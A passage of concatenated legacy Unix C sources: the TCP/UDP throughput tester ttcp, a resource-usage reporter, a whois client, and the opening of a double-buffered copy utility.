#endif /* !SYSV */
		}
	}
	*outp = '\0';
}

static void
tvadd(tsum, t0, t1)
	struct timeval *tsum, *t0, *t1;
{

	tsum->tv_sec = t0->tv_sec + t1->tv_sec;
	tsum->tv_usec = t0->tv_usec + t1->tv_usec;
	if (tsum->tv_usec > 1000000)
		tsum->tv_sec++, tsum->tv_usec -= 1000000;
}

static void
tvsub(tdiff, t1, t0)
	struct timeval *tdiff, *t1, *t0;
{

	tdiff->tv_sec = t1->tv_sec - t0->tv_sec;
	tdiff->tv_usec = t1->tv_usec - t0->tv_usec;
	if (tdiff->tv_usec < 0)
		tdiff->tv_sec--, tdiff->tv_usec += 1000000;
}

static void
psecs(l,cp)
long l;
register char *cp;
{
	register int i;

	i = l / 3600;
	if (i) {
		sprintf(cp,"%d:", i);
		END(cp);
		i = l % 3600;
		sprintf(cp,"%d%d", (i/60) / 10, (i/60) % 10);
		END(cp);
	} else {
		i = l;
		sprintf(cp,"%d", i / 60);
		END(cp);
	}
	i %= 60;
	*cp++ = ':';
	sprintf(cp,"%d%d", i / 10, i % 10);
}

/*
 *			N R E A D
 */
Nread( fd, buf, count )
int fd;
void *buf;
int count;
{
	struct sockaddr_in from;
	int len = sizeof(from);
	register int cnt;
	if( udp )  {
		cnt = recvfrom( fd, buf, count, 0, &from, &len );
		numCalls++;
	} else {
		if( b_flag )
			cnt = mread( fd, buf, count );	/* fill buf */
		else {
			cnt = read( fd, buf, count );
			numCalls++;
		}
		if (touchdata && cnt > 0) {
			register int c = cnt, sum;
			register char *b = buf;
			while (c--)
				sum += *b++;
		}
	}
	return(cnt);
}

/*
 *			N W R I T E
 */
Nwrite( fd, buf, count )
int fd;
void *buf;
int count;
{
	register int cnt;
	if( udp )  {
again:
		cnt = sendto( fd, buf, count, 0, &sinhim, sizeof(sinhim) );
		numCalls++;
		if( cnt<0 && errno == ENOBUFS )  {
			delay(18000);
			errno = 0;
			goto again;
		}
	} else {
		cnt = write( fd, buf, count );
		numCalls++;
	}
	return(cnt);
}

void
delay(us)
{
	struct timeval tv;

	tv.tv_sec = 0;
	tv.tv_usec = us;
	(void)select( 1, (char *)0, (char *)0, (char *)0, &tv );
}

/*
 *			M R E A D
 *
 * This function performs the function of a read(II) but will
 * call read(II) multiple times in order to get the requested
 * number of characters.  This can be necessary because
 * network connections don't deliver data with the same
 * grouping as it is written with.  Written by Robert S. Miles, BRL.
 */
int
mread(fd, bufp, n)
int fd;
register char	*bufp;
unsigned	n;
{
	register unsigned	count = 0;
	register int		nread;

	do {
		nread = read(fd, bufp, n-count);
		numCalls++;
		if(nread < 0)  {
			perror("ttcp_mread");
			return(-1);
		}
		if(nread == 0)
			return((int)count);
		count += (unsigned)nread;
		bufp += nread;
	 } while(count < n);

	return((int)count);
}
::::::::::::::
ttcpn.c
::::::::::::::
/*
 *	T T C P . C
 *
 * Test TCP connection.  Makes a connection on port 5001
 * and transfers fabricated buffers or data copied from stdin.
 *
 * Usable on 4.2, 4.3, and 4.1a systems by defining one of
 * BSD42 BSD43 (BSD41a)
 * Machines using System V with BSD sockets should define SYSV.
 *
 * Modified for operation under 4.2BSD, 18 Dec 84
 *      T.C. Slattery, USNA
 * Minor improvements, Mike Muuss and Terry Slattery, 16-Oct-85.
 *
 * Distribution Status -
 *      Public Domain.  Distribution Unlimited.
 */
#ifndef lint
static char RCSid[] = "@(#)$Revision: 1.2 $ (BRL)";
#endif

#define BSD43
/* #define BSD42 */
/* #define BSD41a */
#if defined(sgi)
#define SYSV
#endif

#include <stdio.h>
#include <signal.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <sys/time.h>		/* struct timeval */

#if defined(SYSV)
#include <sys/times.h>
#include <sys/param.h>
struct rusage {
    struct timeval ru_utime, ru_stime;
};
#define RUSAGE_SELF 0
#else
#include <sys/resource.h>
#endif

struct sockaddr_in sinme;
struct sockaddr_in sinhim;
struct sockaddr_in frominet;

int domain, fromlen;
int fd;				/* fd of network socket */

int buflen = 64 * 1024;		/* length of buffer */
char *buf;			/* ptr to dynamic buffer */
int nbuf = 2 * 1024;		/* number of buffers to send in sinkmode */

/*  nick code  */
int sendwin, optlen, rcvwin, maxseg;
/*  end nick code  */

int udp = 0;			/* 0 = tcp, !0 = udp */
int options = 0;		/* socket options */
int one = 1;                    /* for 4.3 BSD style setsockopt() */
short port = 5001;		/* TCP port number */
char *host;			/* ptr to name of host */
int trans;			/* 0=receive, !0=transmit mode */
int sinkmode = 1;		/* 0=normal I/O, !0=sink/source mode */
int verbose = 0;		/* 0=print basic info, 1=print cpu rate, proc
				 * resource usage. */
int nodelay = 0;		/* set TCP_NODELAY socket option */
int window = 0;			/* 0=use default   1=set to specified size*/

struct hostent *addr;
extern int errno;

char Usage[] = "\
Usage: ttcp -t [-options] host [ <in ]\n\
	-l##	length of bufs written to network (default 8192)\n\
	-s	don't source a pattern to network, use stdin\n\
	-n##	number of source bufs written to network (default 2048)\n\
	-p##	port number to send to (default 5001)\n\
	-u	use UDP instead of TCP\n\
	-D	don't buffer TCP writes (sets TCP_NODELAY socket option)\n\
	-L	set SO_LONGER socket option\n\
Usage: ttcp -r [-options >out]\n\
	-l##	length of network read buf (default 8192)\n\
	-s	don't sink (discard): prints all data from network to stdout\n\
	-p##	port number to listen at (default 5001)\n\
	-B	Only output full blocks, as specified in -l## (for TAR)\n\
	-u	use UDP instead of TCP\n\
";	

char stats[128];
long nbytes;			/* bytes on net */
int numCalls = 0;		/* # of NRead/NWrite calls. */
int b_flag = 0;			/* use mread() */

void prep_timer();
double read_timer();
double cput, realt;		/* user, real time (seconds) */

void
sigpipe()
{
}

main(argc,argv)
int argc;
char **argv;

{
	unsigned long addr_tmp;
/*  nick code  */
optlen = sizeof(maxseg);
sendwin = 32 * 1024;
rcvwin = 32 * 1024;
/* end of nick code  */

	if (argc < 2) goto usage;

	argv++; argc--;
	while( argc>0 && argv[0][0] == '-' )  {
		switch (argv[0][1]) {

		case 'B':
			b_flag = 1;
			break;
		case 't':
			trans = 1;
			break;
		case 'r':
			trans = 0;
			break;
		case 'd':
			options |= SO_DEBUG;
			break;
		case 'D':
			nodelay = 1;
			break;
		case 'n':
			nbuf = atoi(&argv[0][2]);
			break;
		case 'l':
			buflen = atoi(&argv[0][2]);
			break;
		case 'w':
			window=1;
			sendwin = 1024 * atoi(&argv[0][2]);
			rcvwin = sendwin;
			break;
		case 's':
			sinkmode = 0;	/* sink/source data */
			break;
		case 'p':
			port = atoi(&argv[0][2]);
			break;
		case 'u':
			udp = 1;
			buflen=8192;
			break;
		case 'v':
			verbose = 1;
			break;
		default:
			goto usage;
		}
		argv++; argc--;
	}
	if(trans)  {
		/* xmitr */
		if (argc != 1) goto usage;
		bzero((char *)&sinhim, sizeof(sinhim));
		host = argv[0];
		if (atoi(host) > 0 )  {
			/* Numeric */
			sinhim.sin_family = AF_INET;
#ifdef cray
			addr_tmp = inet_addr(host);
			sinhim.sin_addr = addr_tmp;
#else
			sinhim.sin_addr.s_addr = inet_addr(host);
#endif
		} else {
			if ((addr=gethostbyname(host)) == NULL)
				err("bad hostname");
			sinhim.sin_family = addr->h_addrtype;
			bcopy(addr->h_addr,(char*)&addr_tmp, addr->h_length);
#ifdef cray
			sinhim.sin_addr = addr_tmp;
#else
			sinhim.sin_addr.s_addr = addr_tmp;
#endif cray
		}
		sinhim.sin_port = htons(port);
		sinme.sin_port = 0;		/* free choice */
	} else {
		/* rcvr */
		sinme.sin_port =  htons(port);
	}


	if (udp && buflen < 5) {
	    buflen = 5;		/* send more than the sentinel size */
	}

	if( (buf = (char *)malloc(buflen)) == (char *)NULL)
		err("malloc");

	if (trans) {
	    fprintf(stdout,"ttcp-t: buflen=%d, nbuf=%d, port=%d %s  -> %s\n",
		buflen, nbuf, port,
		udp?"udp":"tcp",
		argv[0]);
	} else {
	    fprintf(stdout,"ttcp-r: buflen=%d, nbuf=%d, port=%d %s\n",
		buflen, nbuf, port,
		udp?"udp":"tcp");
	}

	if ((fd = socket(AF_INET, udp?SOCK_DGRAM:SOCK_STREAM, 0)) < 0)
		err("socket");
	mes("socket");

	if (bind(fd, &sinme, sizeof(sinme)) < 0)
		err("bind");

	if (!udp)  {
	    signal(SIGPIPE, sigpipe);
	    if (trans) {
		/* We are the client if transmitting */
		if(options)  {
#ifdef BSD42
/*			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0) */

#else BSD43
/*			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)  */
#endif
				err("setsockopt");
		}
		if(window){
			if( setsockopt(fd, SOL_SOCKET, SO_SNDBUF,
              			&sendwin, sizeof(sendwin)) < 0)
				err("setsockopt");
			if( setsockopt(fd, SOL_SOCKET, SO_RCVBUF,
              			&rcvwin, sizeof(rcvwin)) < 0)
				err("setsockopt");
		}
		if (nodelay) {
			struct protoent *p;
			p = getprotobyname("tcp");
			if( p && setsockopt(fd, p->p_proto, TCP_NODELAY, 
			    &one, sizeof(one)) < 0)
				err("setsockopt: nodelay");
			mes("nodelay");
		}
		if(connect(fd, &sinhim, sizeof(sinhim) ) < 0)
			err("connect");
		mes("connect");
	    } else {
		/* otherwise, we are the server and 
	         * should listen for the connections
	         */
		listen(fd,5);   /* allow a queue of 5 */
		if(options)  {
#ifdef BSD42
			if( setsockopt(fd, SOL_SOCKET, options, 0, 0) < 0)
#else BSD43
			if( setsockopt(fd, SOL_SOCKET, options, &one, sizeof(one)) < 0)
#endif
				err("setsockopt");
		}
		fromlen = sizeof(frominet);
		domain = AF_INET;
		if((fd=accept(fd, &frominet, &fromlen) ) < 0)
			err("accept");
		{ struct sockaddr_in peer;
		  int peerlen = sizeof(peer);
		  if (getpeername(fd, (struct sockaddr_in *) &peer, 
				&peerlen) < 0) {
			err("getpeername");
		  }
		if(window){
			if( setsockopt(fd, SOL_SOCKET, SO_SNDBUF,
              			&sendwin, sizeof(sendwin)) < 0)
				err("setsockopt");
			if( setsockopt(fd, SOL_SOCKET, SO_RCVBUF,
              			&rcvwin, sizeof(rcvwin)) < 0)
				err("setsockopt");
		}
	 	fprintf(stderr,"ttcp-r: accept from %s\n", 
			inet_ntoa(peer.sin_addr));
		}
	    }
	}
	if (getsockopt(fd, SOL_SOCKET, SO_SNDBUF,  &sendwin,
		 &optlen) < 0)
			printf("get send window size didn't work\n");
	else printf("send window size = %d\n", sendwin);
	if (getsockopt(fd, SOL_SOCKET, SO_RCVBUF,  &rcvwin,
		 &optlen) < 0)
			printf("Get recv. window size didn't work\n");
	else printf("receive window size = %d\n", rcvwin);
	prep_timer();
	errno = 0;
	if (sinkmode) {      
		register int cnt;
		if (trans)  {
			pattern( buf, buflen );
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr start */
			while (nbuf-- && Nwrite(fd,buf,buflen) == buflen)
				nbytes += buflen;
			if(udp)  (void)Nwrite( fd, buf, 4 ); /* rcvr end */
		} else {
			if (udp) {
			    while ((cnt=Nread(fd,buf,buflen)) > 0)  {
				    static int going = 0;
				    if( cnt <= 4 )  {
					    if( going )
						    break;	/* "EOF" */
					    going = 1;
					    prep_timer();
				    } else {
					    nbytes += cnt;
				    }
			    }
			} else {
			    while ((cnt=Nread(fd,buf,buflen)) > 0)  {
				    nbytes += cnt;
			    }
			}
		}
	} else {
		register int cnt;
		if (trans)  {
			while((cnt=read(0,buf,buflen)) > 0 &&
			    Nwrite(fd,buf,cnt) == cnt)
				nbytes += cnt;
		}  else  {
			while((cnt=Nread(fd,buf,buflen)) > 0 &&
			    write(1,buf,cnt) == cnt)
				nbytes += cnt;
		}
	}
	if(errno) err("IO");
	(void)read_timer(stats,sizeof(stats));
	if(udp&&trans)  {
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
		(void)Nwrite( fd, buf, 4 ); /* rcvr end */
	}
	if( cput <= 0.0 )  cput = 0.001;
	if( realt <= 0.0 )  realt = 0.001;
	fprintf(stdout,
	"ttcp%s: %ld bytes in %.2f real seconds = %.2f KB/sec = %.4f Mb/s\n",
		trans?"-t":"-r",
		nbytes, realt, ((double)nbytes)/realt/1024,
				((double)nbytes)/realt/128000 );
	if (verbose) {
	    fprintf(stdout,
		"ttcp%s: %ld bytes in %.2f CPU seconds = %.2f KB/cpu sec\n",
		trans?"-t":"-r",
		nbytes, cput, ((double)nbytes)/cput/1024 );
	}
	fprintf(stdout,
		"ttcp%s: %d I/O calls, msec/call = %.2f, calls/sec = %.2f\n",
		trans?"-t":"-r",
		numCalls,
		1024.0 * realt/((double)numCalls),
		((double)numCalls)/realt);

	fprintf(stdout,"ttcp%s: %s\n", trans?"-t":"-r", stats);
	exit(0);

usage:
	fprintf(stderr,Usage);
	exit(1);
}

err(s)
char *s;
{
	fprintf(stderr,"ttcp%s: ", trans?"-t":"-r");
	perror(s);
	fprintf(stderr,"errno=%d\n",errno);
	exit(1);
}

mes(s)
char *s;
{
	fprintf(stderr,"ttcp%s: %s\n", trans?"-t":"-r", s);
}

pattern( cp, cnt )
register char *cp;
register int cnt;
{
	register char c;
	c = 0;
	while( cnt-- > 0 )  {
		while( !isprint((c&0x7F)) )  c++;
		*cp++ = (c++&0x7F);
	}
}


static struct	timeval time0;	/* Time at which timing started */
static struct	rusage ru0;	/* Resource utilization at the start */

static void prusage();
static void tvadd();
static void tvsub();
static void psecs();

#if defined(SYSV)
static
getrusage(ignored, ru)
    int ignored;
    register struct rusage *ru;
{
    struct tms buf;

    times(&buf);

    ru->ru_stime.tv_sec  = buf.tms_stime / HZ;
    ru->ru_stime.tv_usec = (buf.tms_stime % HZ) * (1000000/HZ);
    ru->ru_utime.tv_sec  = buf.tms_utime / HZ;
    ru->ru_utime.tv_usec = (buf.tms_utime % HZ) * (1000000/HZ);
}

#ifndef sgi	/* it's a real system call */
/*ARGSUSED*/
static 
gettimeofday(tp, zp)
    struct timeval *tp;
    struct timezone *zp;
{
    tp->tv_sec = time(0);
    tp->tv_usec = 0;
}
#endif
#endif SYSV

/*
 *			P R E P _ T I M E R
 */
void
prep_timer()
{
	gettimeofday(&time0, (struct timezone *)0);
	getrusage(RUSAGE_SELF, &ru0);
}

/*
 *			R E A D _ T I M E R
 * 
 */
double
read_timer(str,len)
char *str;
{
	struct timeval timedol;
	struct rusage ru1;
	struct timeval td;
	struct timeval tend, tstart;
	char line[132];

	getrusage(RUSAGE_SELF, &ru1);
	gettimeofday(&timedol, (struct timezone *)0);
	prusage(&ru0, &ru1, &timedol, &time0, line);
	(void)strncpy( str, line, len );

	/* Get real time */
	tvsub( &td, &timedol, &time0 );
	realt = td.tv_sec + ((double)td.tv_usec) / 1000000;

	/* Get CPU time (user+sys) */
	tvadd( &tend, &ru1.ru_utime, &ru1.ru_stime );
	tvadd( &tstart, &ru0.ru_utime, &ru0.ru_stime );
	tvsub( &td, &tend, &tstart );
	cput = td.tv_sec + ((double)td.tv_usec) / 1000000;
	if( cput < 0.00001 )  cput = 0.00001;
	return( cput );
}

static void
prusage(r0, r1, e, b, outp)
	register struct rusage *r0, *r1;
	struct timeval *e, *b;
	char *outp;
{
	struct timeval tdiff;
	register time_t t;
	register char *cp;
	register int i;
	int ms;

	t = (r1->ru_utime.tv_sec-r0->ru_utime.tv_sec)*100+
	    (r1->ru_utime.tv_usec-r0->ru_utime.tv_usec)/10000+
	    (r1->ru_stime.tv_sec-r0->ru_stime.tv_sec)*100+
	    (r1->ru_stime.tv_usec-r0->ru_stime.tv_usec)/10000;
	ms =  (e->tv_sec-b->tv_sec)*100 + (e->tv_usec-b->tv_usec)/10000;

#define END(x)	{while(*x) x++;}
#if defined(SYSV)
	cp = "%Uuser %Ssys %Ereal %P";
#else
	cp = "%Uuser %Ssys %Ereal %P %Xi+%Dd %Mmaxrss %F+%Rpf %Ccsw";
#endif
	for (; *cp; cp++)  {
		if (*cp != '%')
			*outp++ = *cp;
		else if (cp[1]) switch(*++cp) {

		case 'U':
			tvsub(&tdiff, &r1->ru_utime, &r0->ru_utime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'S':
			tvsub(&tdiff, &r1->ru_stime, &r0->ru_stime);
			sprintf(outp,"%d.%01d", tdiff.tv_sec, tdiff.tv_usec/100000);
			END(outp);
			break;

		case 'E':
			psecs(ms / 100, outp);
			END(outp);
			break;

		case 'P':
			sprintf(outp,"%d%%", (int) (t*100 / ((ms ? ms : 1))));
			END(outp);
			break;

#if !defined(SYSV)
		case 'W':
			i = r1->ru_nswap - r0->ru_nswap;
			sprintf(outp,"%d", i);
			END(outp);
			break;

		case 'X':
			sprintf(outp,"%d", t == 0 ? 0 : (r1->ru_ixrss-r0->ru_ixrss)/t);
			END(outp);
			break;

		case 'D':
			sprintf(outp,"%d", t == 0 ? 0 :
			    (r1->ru_idrss+r1->ru_isrss-(r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'K':
			sprintf(outp,"%d", t == 0 ? 0 :
			    ((r1->ru_ixrss+r1->ru_isrss+r1->ru_idrss) -
			    (r0->ru_ixrss+r0->ru_idrss+r0->ru_isrss))/t);
			END(outp);
			break;

		case 'M':
			sprintf(outp,"%d", r1->ru_maxrss/2);
			END(outp);
			break;

		case 'F':
			sprintf(outp,"%d", r1->ru_majflt-r0->ru_majflt);
			END(outp);
			break;

		case 'R':
			sprintf(outp,"%d", r1->ru_minflt-r0->ru_minflt);
			END(outp);
			break;

		case 'I':
			sprintf(outp,"%d", r1->ru_inblock-r0->ru_inblock);
			END(outp);
			break;

		case 'O':
			sprintf(outp,"%d", r1->ru_oublock-r0->ru_oublock);
			END(outp);
			break;
		case 'C':
			sprintf(outp,"%d+%d", r1->ru_nvcsw-r0->ru_nvcsw,
				r1->ru_nivcsw-r0->ru_nivcsw );
			END(outp);
			break;
#endif !SYSV
		}
	}
	*outp = '\0';
}

static void
tvadd(tsum, t0, t1)
	struct timeval *tsum, *t0, *t1;
{

	tsum->tv_sec = t0->tv_sec + t1->tv_sec;
	tsum->tv_usec = t0->tv_usec + t1->tv_usec;
	if (tsum->tv_usec > 1000000)
		tsum->tv_sec++, tsum->tv_usec -= 1000000;
}

static void
tvsub(tdiff, t1, t0)
	struct timeval *tdiff, *t1, *t0;
{

	tdiff->tv_sec = t1->tv_sec - t0->tv_sec;
	tdiff->tv_usec = t1->tv_usec - t0->tv_usec;
	if (tdiff->tv_usec < 0)
		tdiff->tv_sec--, tdiff->tv_usec += 1000000;
}

static void
psecs(l,cp)
long l;
register char *cp;
{
	register int i;

	i = l / 3600;
	if (i) {
		sprintf(cp,"%d:", i);
		END(cp);
		i = l % 3600;
		sprintf(cp,"%d%d", (i/60) / 10, (i/60) % 10);
		END(cp);
	} else {
		i = l;
		sprintf(cp,"%d", i / 60);
		END(cp);
	}
	i %= 60;
	*cp++ = ':';
	sprintf(cp,"%d%d", i / 10, i % 10);
}

/*
 *			N R E A D
 */
Nread( fd, buf, count )
	char* buf;
{
	struct sockaddr_in from;
	int len = sizeof(from);
	register int cnt;
	if( udp )  {
		cnt = recvfrom( fd, buf, count, 0, &from, &len );
		numCalls++;
	} else {
		if( b_flag )
			cnt = mread( fd, buf, count );	/* fill buf */
		else {
			cnt = read( fd, buf, count );
			numCalls++;
		}
	}
	return(cnt);
}

/*
 *			N W R I T E
 */
Nwrite( fd, buf, count )
	char* buf;
{
	register int cnt;
	if( udp )  {
again:
		cnt = sendto( fd, buf, count, 0, &sinhim, sizeof(sinhim) );
		numCalls++;
		if( cnt<0 && errno == ENOBUFS )  {
			delay(18000);
			errno = 0;
			goto again;
		}
	} else {
		cnt = write( fd, buf, count );
		numCalls++;
	}
	return(cnt);
}

delay(us)
{
	struct timeval tv;

	tv.tv_sec = 0;
	tv.tv_usec = us;
	(void)select( 1, (char *)0, (char *)0, (char *)0, &tv );
	return(1);
}

/*
 *			M R E A D
 *
 * This function performs the function of a read(II) but will
 * call read(II) multiple times in order to get the requested
 * number of characters.  This can be necessary because
 * network connections don't deliver data with the same
 * grouping as it is written with.  Written by Robert S. Miles, BRL.
 */
int
mread(fd, bufp, n)
int fd;
register char	*bufp;
unsigned	n;
{
	register unsigned	count = 0;
	register int		nread;

	do {
		nread = read(fd, bufp, n-count);
		numCalls++;
		if(nread < 0)  {
			perror("ttcp_mread");
			return(-1);
		}
		if(nread == 0)
			return((int)count);
		count += (unsigned)nread;
		bufp += nread;
	 } while(count < n);

	return((int)count);
}

# endif /* TTCP */

/*	____	____	____	____	____	____	____	____	*/

::::::::::::::
resource.c
::::::::::::::
#ifndef lint
static	char *sccsid = "@(#) $Id: resource.c,v 1.2 1993/06/07 13:17:27 rct Exp $ [resource.c	4.5 (Berkeley) 7/1/83]";
#endif

/*
 * resource
 *
 * print rusage details in a readable form.
 *
 * Log process exit status
 */
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/syslog.h>

void
usage()
{

    fprintf(stderr,"\nresource: [-l] program [arg1 .. argn]\n");
    fprintf(stderr,"\t   -l\tuse syslog to log exit status\n");
    exit(1);
}

main(argc, argv)
	int argc;
	char **argv;
{
	int c, r, exit_sig, status, exitval, coredumped;
	int use_syslog = 0;
	register int p;
	struct timeval before, after;
	struct rusage ru;
	char *signame();
	extern int optind;
	while ((c = getopt(argc, argv, "lm")) != -1) {
	    switch (c) {
	    case 'l':	/* send status msg to syslog */
	    case 'm':
		use_syslog++;
		break;

	    default:
		usage();
	    }
	}

	if (argc <= optind) usage();

	argc -= (optind - 1);
	argv += (optind - 1);

	gettimeofday(&before, 0);
	p = fork();
	if (p < 0) {
		perror("resource");
		exit(1);
	}
	if (p == 0) {
		execvp(argv[1], &argv[1]);
		perror(argv[1]);
		exit(1);
	}
	signal(SIGINT, SIG_IGN);
	signal(SIGQUIT, SIG_IGN);

	while (-1 != (r = wait3(&status, 0, &ru))) {
	    if (p == r) {
		if ((status & 0177) == 0177) {
		    fprintf(stderr,"Process %d stopped\n",p);
		} else {
		    break;
		}
	    } 
	}

	gettimeofday(&after, 0);

	exitval = (status & 0xff00) >> 8;
	coredumped = (status & 0x0080);
	exit_sig = (status & 0x07f);

	if ((!coredumped) && (!exit_sig)) {
	    fprintf(stderr,"%.15s %s[%d]: Process Exited: %d\n",
		    ctime(&after.tv_sec) + 4,
		    argv[1], p, exitval);
	    if (use_syslog) {
		syslog(LOG_DAEMON|LOG_ERR, "%s[%d]: Process Exited: %d",
		       argv[1], p, exitval);
	    }
	} else {
	    fprintf(stderr,"%.15s %s[%d]: Process terminated by %s %s\n",
		    ctime(&after.tv_sec) + 4, argv[1], p,
		    signame(exit_sig), coredumped ? "(coredumped)" : "" );
	    if (use_syslog) {
		syslog(LOG_DAEMON|LOG_CRIT,
		       "%s[%d]: Process terminated by %s %s",
		       argv[1], p,
		       signame(exit_sig), coredumped ? "(coredumped)" : "" );
	    }

	}
	
	if ((status&0377) != 0) {
	    fprintf(stderr, "Command terminated abnormally.\n");
	}
	
	after.tv_sec -= before.tv_sec;
	after.tv_usec -= before.tv_usec;
	if (after.tv_usec < 0)
		after.tv_sec--, after.tv_usec += 1000000;
	fprintf(stderr, "Time:    ");
	printt(&after);
	fprintf(stderr, " real,  ");
	printt(&ru.ru_utime);
	fprintf(stderr, " user CPU,  ");
	printt(&ru.ru_stime);
	fprintf(stderr, " sys CPU\n");
	fprintf(stderr, "Maximum RSS: %3ld\n", ru.ru_maxrss);
	fprintf(stderr, "Memory:    %5ld ixrss,    %5ld idrss,  %5ld isrss\n",
		ru.ru_ixrss, ru.ru_idrss, ru.ru_isrss);
	fprintf(stderr, "Paging:    %5ld reclaims, %5ld faults, %5ld swaps\n",
		ru.ru_minflt, ru.ru_majflt, ru.ru_nswap);
	fprintf(stderr, "Block I/O:%6ld reads,   %6ld writes\n",
		ru.ru_inblock, ru.ru_oublock);
	fprintf(stderr, "Messages: %6ld received, %5ld sent\n",
		ru.ru_msgrcv, ru.ru_msgsnd);
#ifdef gould
	fprintf(stderr, "Bytes: %9ld read, %9ld written\n",
		ru.ru_inbyte, ru.ru_oubyte);
	fprintf(stderr, "(average)  %5ld bytes/rd, %5ld bytes/wr\n",
		ru.ru_inbyte/(ru.ru_inblock+ru.ru_msgrcv),
		ru.ru_oubyte/(ru.ru_oublock+ru.ru_msgsnd));
#endif gould
	fprintf(stderr, "Signals:   %ld\n", ru.ru_nsignals);
	fprintf(stderr, "Context Switches:  %ld voluntary,  %ld involuntary\n",
		ru.ru_nvcsw, ru.ru_nivcsw);
	exit (exitval);
}

printt(tv)
	struct timeval *tv;
{
	fprintf(stderr, "%01d.%02d", tv->tv_sec, tv->tv_usec/100000);
}

/* XXX - really should be generated by make from /usr/include/signal.h */

static char *signames[] = {
"(no signal)",	/* 0 */
"SIGHUP",	/* 1 */
"SIGINT",	/* 2 */
"SIGQUIT",	/* 3 */
"SIGILL",	/* 4 */
"SIGTRAP",	/* 5 */
"SIGABRT",	/* 6 */
"SIGEMT",	/* 7 */
"SIGFPE",	/* 8 */
"SIGKILL",	/* 9 */
"SIGBUS",	/* 10 */
"SIGSEGV",	/* 11 */
"SIGSYS",	/* 12 */
"SIGPIPE",	/* 13 */
"SIGALRM",	/* 14 */
"SIGTERM",	/* 15 */
"SIGURG",	/* 16 */
"SIGSTOP",	/* 17 */
"SIGTSTP",	/* 18 */
"SIGCONT",	/* 19 */
"SIGCHLD",	/* 20 */
"SIGTTIN",	/* 21 */
"SIGTTOU",	/* 22 */
"SIGIO",	/* 23 */
"SIGXCPU",	/* 24 */
"SIGXFSZ",	/* 25 */
"SIGVTALRM",	/* 26 */
"SIGPROF",	/* 27 */
"SIGWINCH",	/* 28 */
"SIGLOST",	/* 29 */
"SIGUSR1",	/* 30 */
"SIGUSR2",	/* 31 */
};

char *
signame(n)
int n;
{
    if ((n > 0) && (n < (sizeof(signames)/sizeof(char *)))) {
	return(signames[n]);
    } else {
	return("(unknown signal)");
    }
}

::::::::::::::
whois.c
::::::::::::::
/*
 *    whois.c:
 *
 *     whois - Internet user name directory service
 *
 *     whois [ -h server ] name
 *
 *     the -h option specifies the hostname or IP address of a whois server.
 *     (see the README file for details)
 *
 * Copyright (c) 1980 Regents of the University of California.
 * All rights reserved.  The Berkeley software License Agreement
 * specifies the terms and conditions for redistribution.
 */

#ifndef lint
char copyright[] =
"@(#) Copyright (c) 1980 Regents of the University of California.\n\
 All rights reserved.\n";
#endif not lint

#ifndef lint
static char sccsid[] = "@(#)whois.c	5.3 (Berkeley) 2/8/88";
#endif not lint

#include <sys/types.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <stdio.h>
#include <netdb.h>

#define	NICHOST	"whois.internic.net"

main(argc, argv)
	int argc;
	char *argv[];
{
	int s;
	register FILE *sfi, *sfo;
	register int c;
	char *host = NICHOST;
	struct sockaddr_in sin;
	struct hostent *hp;
	struct servent *sp;

	argc--, argv++;
	if (argc > 2 && strcmp(*argv, "-h") == 0) {
		argv++, argc--;
		host = *argv++;
		argc--;
	}
	if (argc != 1) {
		fprintf(stderr, "usage: whois [ -h host ] name\n");
		exit(1);
	}
	hp = gethostbyname(host);
	if (hp == NULL) {
		fprintf(stderr, "whois: ");
		herror(host);
		exit(1);
	}
	host = hp->h_name;
	s = socket(hp->h_addrtype, SOCK_STREAM, 0);
	if (s < 0) {
		perror("whois: socket");
		exit(2);
	}
	bzero((caddr_t)&sin, sizeof (sin));
	sin.sin_family = hp->h_addrtype;
	if (bind(s, &sin, sizeof (sin)) < 0) {
		perror("whois: bind");
		exit(3);
	}
	bcopy(hp->h_addr, &sin.sin_addr, hp->h_length);
	sp = getservbyname("whois", "tcp");
	if (sp == NULL) {
		fprintf(stderr, "whois: whois/tcp: unknown service\n");
		exit(4);
	}
	sin.sin_port = sp->s_port;
	if (connect(s, &sin, sizeof (sin)) < 0) {
		perror("whois: connect");
		exit(5);
	}
	sfi = fdopen(s, "r");
	sfo = fdopen(s, "w");
	if (sfi == NULL || sfo == NULL) {
		perror("fdopen");
		close(s);
		exit(1);
	}
	fprintf(sfo, "%s\r\n", *argv);
	fflush(sfo);
	while ((c = getc(sfi)) != EOF)
		putchar(c);
	exit(0);
}

/*
 *	dbcp.c
 *
 *	Double-buffered copy program for V7
 *
 *	Doug Kingston @ DPW
 *
 *	Compile:  cc dbcp.c -o dbcp -i -O -7
 *	Usage:    dbcp {nblocks} < inputfile > outputfile
 */

#include	<stdio.h>

#define	STOP	0170
#define	GO	0017

struct pipefds {
	int	p_rd;
	int	p_wr;
};

int	pid;
long	count;

char	errbuf[BUFSIZ];

extern char *malloc();
extern int errno;

main (argc, argv)
int	argc;
char	**argv;
{
	register char	*buffer;
	register unsigned int	size;
	register unsigned int	nread;
	int	rfd;		/* pipe to read message from */
	int	wfd;		/* pipe to write message to */
	int	exitval;
	int	saverrno;
	char	msgchar;
	struct pipefds par2chld, chld2par;

	if (argc != 2) {
		fprintf(stderr, "Usage:  %s blocksize < input > output\n", argv[0]);
		fprintf(stderr, "        (blocksize = number of 512 byte sectors)\n");
		exit(1);
	}
	size = 512 * atoi(argv[1]);

	setbuf (stderr, errbuf);
	if ((buffer = malloc(size)) == NULL) {
		fprintf(stderr, "dbcp: Insufficient buffer memory\n");
		exit (88);
	}
	if (pipe (&par2chld) < 0 || pipe (&chld2par) < 0) {
		perror ("dbcp: Can't pipe");
		exit (89);
	}

	switch (pid = fork()) {
	case -1:
		perror ("dbcp: Can't fork");
		exit (99);

	case 0:
		/*  Child  */
		close (par2chld.p_wr);
		close (chld2par.p_rd);
